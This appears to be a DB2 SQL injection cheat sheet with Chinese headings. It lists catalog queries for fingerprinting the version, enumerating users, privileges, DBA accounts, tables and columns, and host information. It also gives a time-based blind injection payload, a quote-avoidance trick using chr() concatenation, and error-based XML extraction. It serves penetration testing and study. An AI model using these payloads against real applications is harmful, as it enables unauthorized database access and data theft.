  ##### 版本
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+)
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info
  ##### 注释
	--
  ##### 当前用户
	select user from sysibm.sysdummy1
	select session_user from sysibm.sysdummy1
	select system_user from sysibm.sysdummy1
  ##### 列出用户
	DB2 使用操作系统帐户
	select distinct(authid) from sysibmadm.privileges -- priv required
	select grantee from syscat.dbauth -- incomplete results
	select distinct(definer) from syscat.schemata -- more accurate
	select distinct(grantee) from sysibm.systabauth -- same as previous
  ##### 列出权限
	select * from syscat.tabauth -- shows priv on tables
	select * from syscat.tabauth where grantee = current user -- shows privs for current user
	select * from syscat.dbauth where grantee = current user;;
	select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies
  ##### 列出 DBA 帐户
	select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
	select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
  ##### 当前数据库
	select current server from sysibm.sysdummy1
  ##### 列出数据库
	select distinct(table_catalog) from sysibm.tables
	SELECT schemaname FROM syscat.schemata;
  ##### 列出列
	select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat
  ##### 列表表
	select table_name from sysibm.tables
	select name from sysibm.systables
  ##### 从列名中查找表
	select tbname from sysibm.syscolumns where name='username'
  ##### 选择第 N 行
	select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
  ##### 选择第 N 个字符
	select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b
  ##### 按位与/或/非/异或
	select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot
  ##### ASCII 值
	Char	select chr(65) from sysibm.sysdummy1 -- returns 'A'
  ##### 字符 -> ASCII 值
	select ascii('A') from sysibm.sysdummy1 -- returns 65
  ##### Cast
	select cast('123' as integer) from sysibm.sysdummy1
	select cast(1 as char) from sysibm.sysdummy1
  ##### 字符串连接
	select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc'
	select 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab'
  ##### 避免引用
	SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns “ADRI”. Works without select too
  ##### 时间延迟
	重查询，例如：如果用户以 ascii 68 ('D') 开头，将执行重查询，延迟响应。但是，如果用户不以 ascii 68 开头，则不会执行繁重的查询，因此响应会更快。

	' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
  ##### 序列化为 XML（基于错误）
	select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string
	select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements
	select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.
  ##### 命令执行和本地文件访问
	只允许从程序或 UDF 中使用。

	主机名/IP 和操作系统信息
	select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv
	数据库文件的位置
	select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv
	系统配置
	select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.
	select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg